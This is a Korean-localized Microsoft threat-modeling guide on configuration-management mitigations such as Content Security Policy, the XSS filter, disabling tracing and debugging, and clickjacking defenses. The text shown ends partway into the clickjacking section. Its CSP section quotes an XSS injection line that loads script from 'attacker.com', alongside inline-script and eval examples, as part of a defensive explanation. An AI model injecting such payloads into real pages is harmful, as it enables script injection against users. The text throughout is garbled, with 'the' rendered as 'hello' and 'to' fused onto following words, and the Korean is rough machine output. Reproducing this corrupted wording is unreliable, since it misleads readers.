---
title: "Azure 관리-Microsoft 위협 모델링 도구-aaaConfiguration | Microsoft Docs"
description: "hello 위협 모델링 도구에에서 노출 위협에 대 한 완화"
services: security
documentationcenter: na
author: RodSan
manager: RodSan
editor: RodSan
ms.assetid: na
ms.service: security
ms.workload: na
ms.tgt_pltfrm: na
ms.devlang: na
ms.topic: article
ms.date: 08/17/2017
ms.author: rodsan
ms.openlocfilehash: 77aa4352fa61e928a1b7a4ff1d488a55d3d9b970
ms.sourcegitcommit: 523283cc1b3c37c428e77850964dc1c33742c5f0
ms.translationtype: MT
ms.contentlocale: ko-KR
ms.lasthandoff: 10/06/2017
---
# <a name="security-frame-configuration-management--mitigations"></a><span data-ttu-id="47493-103">보안 프레임: 구성 관리 | 완화</span><span class="sxs-lookup"><span data-stu-id="47493-103">Security Frame: Configuration Management | Mitigations</span></span> 
| <span data-ttu-id="47493-104">제품/서비스</span><span class="sxs-lookup"><span data-stu-id="47493-104">Product/Service</span></span> | <span data-ttu-id="47493-105">문서</span><span class="sxs-lookup"><span data-stu-id="47493-105">Article</span></span> |
| --------------- | ------- |
| <span data-ttu-id="47493-106">**웹 응용 프로그램**</span><span class="sxs-lookup"><span data-stu-id="47493-106">**Web Application**</span></span> | <ul><li>[<span data-ttu-id="47493-107">CSP(콘텐츠 보안 정책)를 구현하고 인라인 JavaScript를 사용하지 않도록 설정</span><span class="sxs-lookup"><span data-stu-id="47493-107">Implement Content Security Policy (CSP), and disable inline javascript</span></span>](#csp-js)</li><li>[<span data-ttu-id="47493-108">브라우저의 XSS 필터를 사용하도록 설정</span><span class="sxs-lookup"><span data-stu-id="47493-108">Enable browser's XSS filter</span></span>](#xss-filter)</li><li>[<span data-ttu-id="47493-109">ASP.NET 응용 프로그램 추적 및 디버깅 이전 toodeployment 사용 하지 않도록 설정 해야 합니다.</span><span class="sxs-lookup"><span data-stu-id="47493-109">ASP.NET applications must disable tracing and debugging prior toodeployment</span></span>](#trace-deploy)</li><li>[<span data-ttu-id="47493-110">신뢰할 수 있는 원본에서만 타사 JavaScript에 액세스</span><span class="sxs-lookup"><span data-stu-id="47493-110">Access third-party javascripts from trusted sources only</span></span>](#js-trusted)</li><li>[<span data-ttu-id="47493-111">인증된 ASP.NET 페이지에 UI 변조(UI Redressing) 또는 클릭재킹(clickjacking) 방어 기능이 통합되어 있는지 확인</span><span class="sxs-lookup"><span data-stu-id="47493-111">Ensure that authenticated ASP.NET pages incorporate UI Redressing or click-jacking defenses</span></span>](#ui-defenses)</li><li>[<span data-ttu-id="47493-112">ASP.NET 웹 응용 프로그램에서 CORS를 사용하도록 설정하는 경우 신뢰할 수 있는 원본만 허용되는지 확인</span><span class="sxs-lookup"><span data-stu-id="47493-112">Ensure that only trusted origins are allowed if CORS is enabled on ASP.NET Web Applications</span></span>](#cors-aspnet)</li><li>[<span data-ttu-id="47493-113">ASP.NET 페이지에서 ValidateRequest 특성을 사용하도록 설정</span><span class="sxs-lookup"><span data-stu-id="47493-113">Enable ValidateRequest attribute on ASP.NET Pages</span></span>](#validate-aspnet)</li><li>[<span data-ttu-id="47493-114">로컬로 호스팅되는 최신 버전의 JavaScript 라이브러리 사용</span><span class="sxs-lookup"><span data-stu-id="47493-114">Use locally-hosted latest versions of JavaScript libraries</span></span>](#local-js)</li><li>[<span data-ttu-id="47493-115">자동 MIME 스니핑을 사용하지 않도록 설정</span><span class="sxs-lookup"><span data-stu-id="47493-115">Disable automatic MIME sniffing</span></span>](#mime-sniff)</li><li>[<span data-ttu-id="47493-116">Windows Azure 웹 사이트 tooavoid 지문에 표준 서버 헤더를 제거 합니다.</span><span class="sxs-lookup"><span data-stu-id="47493-116">Remove standard server headers on Windows Azure Web Sites tooavoid fingerprinting</span></span>](#standard-finger)</li></ul> |
| <span data-ttu-id="47493-117">**데이터베이스**</span><span class="sxs-lookup"><span data-stu-id="47493-117">**Database**</span></span> | <ul><li>[<span data-ttu-id="47493-118">데이터베이스 엔진 액세스를 위한 Windows 방화벽 구성</span><span class="sxs-lookup"><span data-stu-id="47493-118">Configure a Windows Firewall for Database Engine Access</span></span>](#firewall-db)</li></ul> |
| <span data-ttu-id="47493-119">**앱 API**</span><span class="sxs-lookup"><span data-stu-id="47493-119">**Web API**</span></span> | <ul><li>[<span data-ttu-id="47493-120">ASP.NET Web API에서 CORS를 사용하도록 설정하는 경우 신뢰할 수 있는 원본만 허용되는지 확인</span><span class="sxs-lookup"><span data-stu-id="47493-120">Ensure that only trusted origins are allowed if CORS is enabled on ASP.NET Web API</span></span>](#cors-api)</li><li>[<span data-ttu-id="47493-121">중요한 데이터가 포함된 Web API 구성 파일의 섹션 암호화</span><span class="sxs-lookup"><span data-stu-id="47493-121">Encrypt sections of Web API's configuration files that contain sensitive data</span></span>](#config-sensitive)</li></ul> |
| <span data-ttu-id="47493-122">**IoT 장치**</span><span class="sxs-lookup"><span data-stu-id="47493-122">**IoT Device**</span></span> | <ul><li>[<span data-ttu-id="47493-123">모든 관리 인터페이스를 강력한 자격 증명으로 보호하는지 확인</span><span class="sxs-lookup"><span data-stu-id="47493-123">Ensure that all admin interfaces are secured with strong credentials</span></span>](#admin-strong)</li><li>[<span data-ttu-id="47493-124">장치에서 알 수 없는 코드를 실행할 수 없는지 확인</span><span class="sxs-lookup"><span data-stu-id="47493-124">Ensure that unknown code cannot execute on devices</span></span>](#unknown-exe)</li><li>[<span data-ttu-id="47493-125">bit-locker를 사용하여 OS 및 IoT 장치의 추가 파티션 암호화</span><span class="sxs-lookup"><span data-stu-id="47493-125">Encrypt OS and additional partitions of IoT Device with bit-locker</span></span>](#partition-iot)</li><li>[<span data-ttu-id="47493-126">장치에만 hello 최소 서비스/기능이 활성화 되어 있는지 확인 하십시오.</span><span class="sxs-lookup"><span data-stu-id="47493-126">Ensure that only hello minimum services/features are enabled on devices</span></span>](#min-enable)</li></ul> |
| <span data-ttu-id="47493-127">**IoT 필드 게이트웨이**</span><span class="sxs-lookup"><span data-stu-id="47493-127">**IoT Field Gateway**</span></span> | <ul><li>[<span data-ttu-id="47493-128">bit-locker를 사용하여 OS 및 IoT 필드 게이트웨이의 추가 파티션 암호화</span><span class="sxs-lookup"><span data-stu-id="47493-128">Encrypt OS and additional partitions of IoT Field Gateway with bit-locker</span></span>](#field-bit-locker)</li><li>[<span data-ttu-id="47493-129">Hello 기본 로그인 자격 증명의 hello 필드 게이트웨이 설치 하는 동안 변경 않았는지 확인 하십시오</span><span class="sxs-lookup"><span data-stu-id="47493-129">Ensure that hello default login credentials of hello field gateway are changed during installation</span></span>](#default-change)</li></ul> |
| <span data-ttu-id="47493-130">**IoT 클라우드 게이트웨이**</span><span class="sxs-lookup"><span data-stu-id="47493-130">**IoT Cloud Gateway**</span></span> | <ul><li>[<span data-ttu-id="47493-131">해당 hello 클라우드 게이트웨이 구현 toodate 프로세스 tookeep hello 연결 된 장치 펌웨어 확인</span><span class="sxs-lookup"><span data-stu-id="47493-131">Ensure that hello Cloud Gateway implements a process tookeep hello connected devices firmware up toodate</span></span>](#cloud-firmware)</li></ul> |
| <span data-ttu-id="47493-132">**컴퓨터 신뢰 경계**</span><span class="sxs-lookup"><span data-stu-id="47493-132">**Machine Trust Boundary**</span></span> | <ul><li>[<span data-ttu-id="47493-133">장치에서 조직 정책에 따라 구성된 끝점 보안 제어를 사용하는지 확인</span><span class="sxs-lookup"><span data-stu-id="47493-133">Ensure that devices have end-point security controls configured as per organizational policies</span></span>](#controls-policies)</li></ul> |
| <span data-ttu-id="47493-134">**Azure 저장소**</span><span class="sxs-lookup"><span data-stu-id="47493-134">**Azure Storage**</span></span> | <ul><li>[<span data-ttu-id="47493-135">Azure 저장소 액세스 키의 보안 관리 확인</span><span class="sxs-lookup"><span data-stu-id="47493-135">Ensure secure management of Azure storage access keys</span></span>](#secure-keys)</li><li>[<span data-ttu-id="47493-136">Azure 저장소에서 CORS를 사용하도록 설정하는 경우 신뢰할 수 있는 원본만 허용되는지 확인</span><span class="sxs-lookup"><span data-stu-id="47493-136">Ensure that only trusted origins are allowed if CORS is enabled on Azure storage</span></span>](#cors-storage)</li></ul> |
| <span data-ttu-id="47493-137">**WCF**</span><span class="sxs-lookup"><span data-stu-id="47493-137">**WCF**</span></span> | <ul><li>[<span data-ttu-id="47493-138">WCF의 서비스 제한 기능을 사용하도록 설정</span><span class="sxs-lookup"><span data-stu-id="47493-138">Enable WCF's service throttling feature</span></span>](#throttling)</li><li>[<span data-ttu-id="47493-139">WCF - 메타데이터를 통한 정보 공개</span><span class="sxs-lookup"><span data-stu-id="47493-139">WCF-Information disclosure through metadata</span></span>](#info-metadata)</li></ul> | 

## <span data-ttu-id="47493-140"><a id="csp-js"></a>CSP(콘텐츠 보안 정책)를 구현하고 인라인 JavaScript를 사용하지 않도록 설정</span><span class="sxs-lookup"><span data-stu-id="47493-140"><a id="csp-js"></a>Implement Content Security Policy (CSP), and disable inline javascript</span></span>

| <span data-ttu-id="47493-141">제목</span><span class="sxs-lookup"><span data-stu-id="47493-141">Title</span></span>                   | <span data-ttu-id="47493-142">세부 정보</span><span class="sxs-lookup"><span data-stu-id="47493-142">Details</span></span>      |
| ----------------------- | ------------ |
| <span data-ttu-id="47493-143">**구성 요소**</span><span class="sxs-lookup"><span data-stu-id="47493-143">**Component**</span></span>               | <span data-ttu-id="47493-144">웹 응용 프로그램</span><span class="sxs-lookup"><span data-stu-id="47493-144">Web Application</span></span> | 
| <span data-ttu-id="47493-145">**SDL 단계**</span><span class="sxs-lookup"><span data-stu-id="47493-145">**SDL Phase**</span></span>               | <span data-ttu-id="47493-146">빌드</span><span class="sxs-lookup"><span data-stu-id="47493-146">Build</span></span> |  
| <span data-ttu-id="47493-147">**적용 가능한 기술**</span><span class="sxs-lookup"><span data-stu-id="47493-147">**Applicable Technologies**</span></span> | <span data-ttu-id="47493-148">일반</span><span class="sxs-lookup"><span data-stu-id="47493-148">Generic</span></span> |
| <span data-ttu-id="47493-149">**특성**</span><span class="sxs-lookup"><span data-stu-id="47493-149">**Attributes**</span></span>              | <span data-ttu-id="47493-150">해당 없음</span><span class="sxs-lookup"><span data-stu-id="47493-150">N/A</span></span>  |
| <span data-ttu-id="47493-151">**참조**</span><span class="sxs-lookup"><span data-stu-id="47493-151">**References**</span></span>              | <span data-ttu-id="47493-152">[소개 tooContent 보안 정책](http://www.html5rocks.com/en/tutorials/security/content-security-policy/), [콘텐츠 보안 정책 참조](http://content-security-policy.com/), [보안 기능](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/), [소개 toocontent 보안 정책](https://docs.webplatform.org/wiki/tutorials/content-security-policy), [CSP 사용할 수 있습니까?](http://caniuse.com/#feat=contentsecuritypolicy)</span><span class="sxs-lookup"><span data-stu-id="47493-152">[An Introduction tooContent Security Policy](http://www.html5rocks.com/en/tutorials/security/content-security-policy/), [Content Security Policy Reference](http://content-security-policy.com/), [Security features](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/), [Introduction toocontent security policy](https://docs.webplatform.org/wiki/tutorials/content-security-policy), [Can I use CSP?](http://caniuse.com/#feat=contentsecuritypolicy)</span></span> |
| <span data-ttu-id="47493-153">**단계**</span><span class="sxs-lookup"><span data-stu-id="47493-153">**Steps**</span></span> | <p><span data-ttu-id="47493-154">콘텐츠 보안 정책 (CSP)는 방어 보안 메커니즘은 표준는 W3C hello 콘텐츠에 자신의 사이트에 포함 된 웹 응용 프로그램 소유자 toohave 컨트롤 수 있도록 합니다.</span><span class="sxs-lookup"><span data-stu-id="47493-154">Content Security Policy (CSP) is a defense-in-depth security mechanism, a W3C standard, that enables web application owners toohave control on hello content embedded in their site.</span></span> <span data-ttu-id="47493-155">CSP은 hello 웹 서버에서 HTTP 응답 헤더도 추가 되 고 브라우저에서 클라이언트측 hello에 적용 됩니다.</span><span class="sxs-lookup"><span data-stu-id="47493-155">CSP is added as an HTTP response header on hello web server and is enforced on hello client side by browsers.</span></span> <span data-ttu-id="47493-156">허용 목록 기반 정책이며, 웹 사이트에서 JavaScript와 같은 액티브 콘텐츠를 로드할 수 있는 트러스트된 도메인 집합을 선언할 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="47493-156">It is a whitelist-based policy - a website can declare a set of trusted domains from which active content such as JavaScript can be loaded.</span></span></p><p><span data-ttu-id="47493-157">CSP hello를 다음 보안 이점을 제공 합니다.</span><span class="sxs-lookup"><span data-stu-id="47493-157">CSP provides hello following security benefits:</span></span></p><ul><li><span data-ttu-id="47493-158">**방지할 수 있는 XSS:** 페이지가 취약 tooXSS 있으면 공격자 악용할 수 있는 것에 두 가지 방법:</span><span class="sxs-lookup"><span data-stu-id="47493-158">**Protection against XSS:** If a page is vulnerable tooXSS, an attacker can exploit it in 2 ways:</span></span><ul><li><span data-ttu-id="47493-159">`<script>malicious code</script>`를 삽입합니다.</span><span class="sxs-lookup"><span data-stu-id="47493-159">Inject `<script>malicious code</script>`.</span></span> <span data-ttu-id="47493-160">이 악용 tooCSP의 기본 제한이-1 기한 작동 하지 않습니다.</span><span class="sxs-lookup"><span data-stu-id="47493-160">This exploit will not work due tooCSP’s Base Restriction-1</span></span></li><li><span data-ttu-id="47493-161">`<script src=”http://attacker.com/maliciousCode.js”/>`를 삽입합니다.</span><span class="sxs-lookup"><span data-stu-id="47493-161">Inject `<script src=”http://attacker.com/maliciousCode.js”/>`.</span></span> <span data-ttu-id="47493-162">Hello 제어 하는 공격자가 도메인은 도메인의 CSP의 허용 목록에 사용할 수 없기 때문에이 악용 작동 하지 않습니다.</span><span class="sxs-lookup"><span data-stu-id="47493-162">This exploit will not work since hello attacker controlled domain will not be in CSP’s whitelist of domains</span></span></li></ul></li><li><span data-ttu-id="47493-163">**데이터 exfiltration 제어할:** hello 연결 tooconnect tooan 외부 웹 사이트 및 데이터 도용 만들려고 할 경우 악성 콘텐츠는 웹 페이지에서 CSP에서 중단 됩니다.</span><span class="sxs-lookup"><span data-stu-id="47493-163">**Control over data exfiltration:** If any malicious content on a webpage attempts tooconnect tooan external website and steal data, hello connection will be aborted by CSP.</span></span> <span data-ttu-id="47493-164">이 hello 대상 도메인 CSP의 허용 목록에 되지 않으므로</span><span class="sxs-lookup"><span data-stu-id="47493-164">This is because hello target domain will not be in CSP’s whitelist</span></span></li><li><span data-ttu-id="47493-165">**클릭 jacking을 막는 최전방:** 클릭 jacking는 공격 기술 정품 웹 사이트를 작성 하 고 UI 요소에서 사용자가 tooclick 강제로 수 악의적인 사용자는를 사용 하 여 합니다.</span><span class="sxs-lookup"><span data-stu-id="47493-165">**Defense against click-jacking:** click-jacking is an attack technique using which an adversary can frame a genuine website and force users tooclick on UI elements.</span></span> <span data-ttu-id="47493-166">현재 클릭재킹에 대한 방어는 X-Frame-Options 응답 헤더를 구성하여 수행됩니다.</span><span class="sxs-lookup"><span data-stu-id="47493-166">Currently defense against click-jacking is achieved by configuring a response header- X-Frame-Options.</span></span> <span data-ttu-id="47493-167">이 헤더를 준수 하지 않는 브라우저 및 CSP 앞으로 이동 클릭 jacking에 대 한 표준 방식으로 toodefend 됩니다.</span><span class="sxs-lookup"><span data-stu-id="47493-167">Not all browsers respect this header and going forward CSP will be a standard way toodefend against click-jacking</span></span></li><li><span data-ttu-id="47493-168">**실시간 공격 보고:** 브라우저 hello 웹 서버에 구성 된 알림 tooan 끝점을 자동으로 트리거합니다 CSP 지원 웹 사이트에 대 한 삽입 공격 하는 경우.</span><span class="sxs-lookup"><span data-stu-id="47493-168">**Real-time attack reporting:** If there is an injection attack on a CSP-enabled website, browsers will automatically trigger a notification tooan endpoint configured on hello webserver.</span></span> <span data-ttu-id="47493-169">CSP는 이러한 방식으로 실시간 경고 시스템의 역할을 수행합니다.</span><span class="sxs-lookup"><span data-stu-id="47493-169">This way, CSP serves as a real-time warning system.</span></span></li></ul> |

### <a name="example"></a><span data-ttu-id="47493-170">예제</span><span class="sxs-lookup"><span data-stu-id="47493-170">Example</span></span>
<span data-ttu-id="47493-171">예제 정책:</span><span class="sxs-lookup"><span data-stu-id="47493-171">Example policy:</span></span> 
```C#
Content-Security-Policy: default-src 'self'; script-src 'self' www.google-analytics.com 
```
<span data-ttu-id="47493-172">이 정책 hello 웹 응용 프로그램의 서버 및 google analytics 서버 에서만 스크립트 tooload가 있습니다.</span><span class="sxs-lookup"><span data-stu-id="47493-172">This policy allows scripts tooload only from hello web application’s server and google analytics server.</span></span> <span data-ttu-id="47493-173">다른 사이트에서 로드한 스크립트는 거부됩니다.</span><span class="sxs-lookup"><span data-stu-id="47493-173">Scripts loaded from any other site will be rejected.</span></span> <span data-ttu-id="47493-174">CSP는 웹 사이트에서 사용 하도록 설정 하는 경우 hello 다음 기능은 자동으로 비활성화 된 toomitigate XSS 공격입니다.</span><span class="sxs-lookup"><span data-stu-id="47493-174">When CSP is enabled on a website, hello following features are automatically disabled toomitigate XSS attacks.</span></span> 

### <a name="example"></a><span data-ttu-id="47493-175">예제</span><span class="sxs-lookup"><span data-stu-id="47493-175">Example</span></span>
<span data-ttu-id="47493-176">인라인 스크립트가 실행되지 않습니다.</span><span class="sxs-lookup"><span data-stu-id="47493-176">Inline scripts will not execute.</span></span> <span data-ttu-id="47493-177">다음은 인라인 스크립트의 예제입니다.</span><span class="sxs-lookup"><span data-stu-id="47493-177">Following are examples of inline scripts</span></span> 
```javascript
<script> some Javascript code </script>
Event handling attributes of HTML tags (e.g., <button onclick=”function(){}”>
javascript:alert(1);
```

### <a name="example"></a><span data-ttu-id="47493-178">예제</span><span class="sxs-lookup"><span data-stu-id="47493-178">Example</span></span>
<span data-ttu-id="47493-179">문자열이 코드로 평가되지 않습니다.</span><span class="sxs-lookup"><span data-stu-id="47493-179">Strings will not be evaluated as code.</span></span> 
```javascript
Example: var str="alert(1)"; eval(str);
```

## <span data-ttu-id="47493-180"><a id="xss-filter"></a>브라우저의 XSS 필터를 사용하도록 설정</span><span class="sxs-lookup"><span data-stu-id="47493-180"><a id="xss-filter"></a>Enable browser's XSS filter</span></span>

| <span data-ttu-id="47493-181">제목</span><span class="sxs-lookup"><span data-stu-id="47493-181">Title</span></span>                   | <span data-ttu-id="47493-182">세부 정보</span><span class="sxs-lookup"><span data-stu-id="47493-182">Details</span></span>      |
| ----------------------- | ------------ |
| <span data-ttu-id="47493-183">**구성 요소**</span><span class="sxs-lookup"><span data-stu-id="47493-183">**Component**</span></span>               | <span data-ttu-id="47493-184">웹 응용 프로그램</span><span class="sxs-lookup"><span data-stu-id="47493-184">Web Application</span></span> | 
| <span data-ttu-id="47493-185">**SDL 단계**</span><span class="sxs-lookup"><span data-stu-id="47493-185">**SDL Phase**</span></span>               | <span data-ttu-id="47493-186">빌드</span><span class="sxs-lookup"><span data-stu-id="47493-186">Build</span></span> |  
| <span data-ttu-id="47493-187">**적용 가능한 기술**</span><span class="sxs-lookup"><span data-stu-id="47493-187">**Applicable Technologies**</span></span> | <span data-ttu-id="47493-188">일반</span><span class="sxs-lookup"><span data-stu-id="47493-188">Generic</span></span> |
| <span data-ttu-id="47493-189">**특성**</span><span class="sxs-lookup"><span data-stu-id="47493-189">**Attributes**</span></span>              | <span data-ttu-id="47493-190">해당 없음</span><span class="sxs-lookup"><span data-stu-id="47493-190">N/A</span></span>  |
| <span data-ttu-id="47493-191">**참조**</span><span class="sxs-lookup"><span data-stu-id="47493-191">**References**</span></span>              | <span data-ttu-id="47493-192">[XSS 보호 필터](https://www.owasp.org/index.php/List_of_useful_HTTP_headers#X-XSS-Protection)(영문)</span><span class="sxs-lookup"><span data-stu-id="47493-192">[XSS Protection Filter](https://www.owasp.org/index.php/List_of_useful_HTTP_headers#X-XSS-Protection)</span></span> |
| <span data-ttu-id="47493-193">**단계**</span><span class="sxs-lookup"><span data-stu-id="47493-193">**Steps**</span></span> | <p><span data-ttu-id="47493-194">X XSS 보호 응답 헤더 구성 컨트롤 hello 브라우저의 사이트 간 스크립트 필터입니다.</span><span class="sxs-lookup"><span data-stu-id="47493-194">X-XSS-Protection response header configuration controls hello browser's cross site script filter.</span></span> <span data-ttu-id="47493-195">이 응답 헤더의 값은 다음과 같습니다.</span><span class="sxs-lookup"><span data-stu-id="47493-195">This response header can have following values:</span></span></p><ul><li><span data-ttu-id="47493-196">`0:`이 hello 필터 비활성화 됩니다.</span><span class="sxs-lookup"><span data-stu-id="47493-196">`0:` This will disable hello filter</span></span></li><li><span data-ttu-id="47493-197">`1: Filter enabled`Hello 브라우저 hello 페이지를 정리 합니다 순서 toostop hello 공격에서 사이트 간 스크립팅 공격이 감지 된 경우</span><span class="sxs-lookup"><span data-stu-id="47493-197">`1: Filter enabled` If a cross-site scripting attack is detected, in order toostop hello attack, hello browser will sanitize hello page</span></span></li><li><span data-ttu-id="47493-198">`1: mode=block : Filter enabled`</span><span class="sxs-lookup"><span data-stu-id="47493-198">`1: mode=block : Filter enabled`.</span></span> <span data-ttu-id="47493-199">Hello 브라우저 hello 페이지의 렌더링 되지 것입니다 XSS 공격 검색 되 면 hello 페이지를 정리 하지 않고</span><span class="sxs-lookup"><span data-stu-id="47493-199">Rather than sanitize hello page, when a XSS attack is detected, hello browser will prevent rendering of hello page</span></span></li><li><span data-ttu-id="47493-200">`1: report=http://[YOURDOMAIN]/your_report_URI : Filter enabled`</span><span class="sxs-lookup"><span data-stu-id="47493-200">`1: report=http://[YOURDOMAIN]/your_report_URI : Filter enabled`.</span></span> <span data-ttu-id="47493-201">hello 브라우저 hello 페이지 및 보고서 hello 위반을 정리 됩니다.</span><span class="sxs-lookup"><span data-stu-id="47493-201">hello browser will sanitize hello page and report hello violation.</span></span></li></ul><p><span data-ttu-id="47493-202">이 CSP 위반 보고서 toosend 세부 정보 tooa 선택한의 URI를 사용 하 여 Chromium 함수.</span><span class="sxs-lookup"><span data-stu-id="47493-202">This is a Chromium function utilizing CSP violation reports toosend details tooa URI of your choice.</span></span> <span data-ttu-id="47493-203">hello 마지막 두 개 이상의 옵션 값으로 간주 됩니다 안전 합니다.</span><span class="sxs-lookup"><span data-stu-id="47493-203">hello last 2 options are considered safe values.</span></span></p>|

## <span data-ttu-id="47493-204"><a id="trace-deploy"></a>ASP.NET 응용 프로그램 추적 및 디버깅 이전 toodeployment 사용 하지 않도록 설정 해야 합니다.</span><span class="sxs-lookup"><span data-stu-id="47493-204"><a id="trace-deploy"></a>ASP.NET applications must disable tracing and debugging prior toodeployment</span></span>

| <span data-ttu-id="47493-205">제목</span><span class="sxs-lookup"><span data-stu-id="47493-205">Title</span></span>                   | <span data-ttu-id="47493-206">세부 정보</span><span class="sxs-lookup"><span data-stu-id="47493-206">Details</span></span>      |
| ----------------------- | ------------ |
| <span data-ttu-id="47493-207">**구성 요소**</span><span class="sxs-lookup"><span data-stu-id="47493-207">**Component**</span></span>               | <span data-ttu-id="47493-208">웹 응용 프로그램</span><span class="sxs-lookup"><span data-stu-id="47493-208">Web Application</span></span> | 
| <span data-ttu-id="47493-209">**SDL 단계**</span><span class="sxs-lookup"><span data-stu-id="47493-209">**SDL Phase**</span></span>               | <span data-ttu-id="47493-210">빌드</span><span class="sxs-lookup"><span data-stu-id="47493-210">Build</span></span> |  
| <span data-ttu-id="47493-211">**적용 가능한 기술**</span><span class="sxs-lookup"><span data-stu-id="47493-211">**Applicable Technologies**</span></span> | <span data-ttu-id="47493-212">일반</span><span class="sxs-lookup"><span data-stu-id="47493-212">Generic</span></span> |
| <span data-ttu-id="47493-213">**특성**</span><span class="sxs-lookup"><span data-stu-id="47493-213">**Attributes**</span></span>              | <span data-ttu-id="47493-214">해당 없음</span><span class="sxs-lookup"><span data-stu-id="47493-214">N/A</span></span>  |
| <span data-ttu-id="47493-215">**참조**</span><span class="sxs-lookup"><span data-stu-id="47493-215">**References**</span></span>              | <span data-ttu-id="47493-216">[ASP.NET 디버깅 개요](http://msdn2.microsoft.com/library/ms227556.aspx), [ASP.NET 추적 개요](http://msdn2.microsoft.com/library/bb386420.aspx), [방법: ASP.NET 응용 프로그램에 대한 추적 활성화](http://msdn2.microsoft.com/library/0x5wc973.aspx), [방법: ASP.NET 응용 프로그램에 디버깅 사용](http://msdn2.microsoft.com/library/e8z01xdh(VS.80).aspx)</span><span class="sxs-lookup"><span data-stu-id="47493-216">[ASP.NET Debugging Overview](http://msdn2.microsoft.com/library/ms227556.aspx), [ASP.NET Tracing Overview](http://msdn2.microsoft.com/library/bb386420.aspx), [How to: Enable Tracing for an ASP.NET Application](http://msdn2.microsoft.com/library/0x5wc973.aspx), [How to: Enable Debugging for ASP.NET Applications](http://msdn2.microsoft.com/library/e8z01xdh(VS.80).aspx)</span></span> |
| <span data-ttu-id="47493-217">**단계**</span><span class="sxs-lookup"><span data-stu-id="47493-217">**Steps**</span></span> | <span data-ttu-id="47493-218">Hello 페이지에 대 한 추적을 사용 하는 경우도 요청 하는 모든 브라우저 내부 서버 상태와 워크플로 대 한 데이터를 포함 하는 hello 추적 정보를 가져옵니다.</span><span class="sxs-lookup"><span data-stu-id="47493-218">When tracing is enabled for hello page, every browser requesting it also obtains hello trace information that contains data about internal server state and workflow.</span></span> <span data-ttu-id="47493-219">이 정보는 보안에 중요할 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="47493-219">That information could be security sensitive.</span></span> <span data-ttu-id="47493-220">Hello 페이지를 디버깅 하도록 구성 되어 전체 스택 추적 데이터의 hello 서버 결과에서 발생 하는 오류 toohello 브라우저를 나타납니다.</span><span class="sxs-lookup"><span data-stu-id="47493-220">When debugging is enabled for hello page, errors happening on hello server result in a full stack trace data presented toohello browser.</span></span> <span data-ttu-id="47493-221">해당 데이터는 hello 서버 워크플로에 대 한 보안 관련 정보를 노출할 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="47493-221">That data may expose security-sensitive information about hello server's workflow.</span></span> |

## <span data-ttu-id="47493-222"><a id="js-trusted"></a>신뢰할 수 있는 원본에서만 타사 JavaScript에 액세스</span><span class="sxs-lookup"><span data-stu-id="47493-222"><a id="js-trusted"></a>Access third-party javascripts from trusted sources only</span></span>

| <span data-ttu-id="47493-223">제목</span><span class="sxs-lookup"><span data-stu-id="47493-223">Title</span></span>                   | <span data-ttu-id="47493-224">세부 정보</span><span class="sxs-lookup"><span data-stu-id="47493-224">Details</span></span>      |
| ----------------------- | ------------ |
| <span data-ttu-id="47493-225">**구성 요소**</span><span class="sxs-lookup"><span data-stu-id="47493-225">**Component**</span></span>               | <span data-ttu-id="47493-226">웹 응용 프로그램</span><span class="sxs-lookup"><span data-stu-id="47493-226">Web Application</span></span> | 
| <span data-ttu-id="47493-227">**SDL 단계**</span><span class="sxs-lookup"><span data-stu-id="47493-227">**SDL Phase**</span></span>               | <span data-ttu-id="47493-228">빌드</span><span class="sxs-lookup"><span data-stu-id="47493-228">Build</span></span> |  
| <span data-ttu-id="47493-229">**적용 가능한 기술**</span><span class="sxs-lookup"><span data-stu-id="47493-229">**Applicable Technologies**</span></span> | <span data-ttu-id="47493-230">일반</span><span class="sxs-lookup"><span data-stu-id="47493-230">Generic</span></span> |
| <span data-ttu-id="47493-231">**특성**</span><span class="sxs-lookup"><span data-stu-id="47493-231">**Attributes**</span></span>              | <span data-ttu-id="47493-232">해당 없음</span><span class="sxs-lookup"><span data-stu-id="47493-232">N/A</span></span>  |
| <span data-ttu-id="47493-233">**참조**</span><span class="sxs-lookup"><span data-stu-id="47493-233">**References**</span></span>              | <span data-ttu-id="47493-234">해당 없음</span><span class="sxs-lookup"><span data-stu-id="47493-234">N/A</span></span>  |
| <span data-ttu-id="47493-235">**단계**</span><span class="sxs-lookup"><span data-stu-id="47493-235">**Steps**</span></span> | <span data-ttu-id="47493-236">타사 JavaScript는 신뢰할 수 있는 원본에서만 참조해야 합니다.</span><span class="sxs-lookup"><span data-stu-id="47493-236">third-party JavaScripts should be referenced only from trusted sources.</span></span> <span data-ttu-id="47493-237">hello 참조 끝점 SSL에 항상 있어야 합니다.</span><span class="sxs-lookup"><span data-stu-id="47493-237">hello reference endpoints should always be on SSL.</span></span> |

## <span data-ttu-id="47493-238"><a id="ui-defenses"></a>인증된 ASP.NET 페이지에 UI 변조(UI Redressing) 또는 클릭재킹(clickjacking) 방어 기능이 통합되어 있는지 확인</span><span class="sxs-lookup"><span data-stu-id="47493-238"><a id="ui-defenses"></a>Ensure that authenticated ASP.NET pages incorporate UI Redressing or click-jacking defenses</span></span>

| <span data-ttu-id="47493-239">제목</span><span class="sxs-lookup"><span data-stu-id="47493-239">Title</span></span>                   | <span data-ttu-id="47493-240">세부 정보</span><span class="sxs-lookup"><span data-stu-id="47493-240">Details</span></span>      |
| ----------------------- | ------------ |
| <span data-ttu-id="47493-241">**구성 요소**</span><span class="sxs-lookup"><span data-stu-id="47493-241">**Component**</span></span>               | <span data-ttu-id="47493-242">웹 응용 프로그램</span><span class="sxs-lookup"><span data-stu-id="47493-242">Web Application</span></span> | 
| <span data-ttu-id="47493-243">**SDL 단계**</span><span class="sxs-lookup"><span data-stu-id="47493-243">**SDL Phase**</span></span>               | <span data-ttu-id="47493-244">빌드</span><span class="sxs-lookup"><span data-stu-id="47493-244">Build</span></span> |  
| <span data-ttu-id="47493-245">**적용 가능한 기술**</span><span class="sxs-lookup"><span data-stu-id="47493-245">**Applicable Technologies**</span></span> | <span data-ttu-id="47493-246">일반</span><span class="sxs-lookup"><span data-stu-id="47493-246">Generic</span></span> |
| <span data-ttu-id="47493-247">**특성**</span><span class="sxs-lookup"><span data-stu-id="47493-247">**Attributes**</span></span>              | <span data-ttu-id="47493-248">해당 없음</span><span class="sxs-lookup"><span data-stu-id="47493-248">N/A</span></span>  |
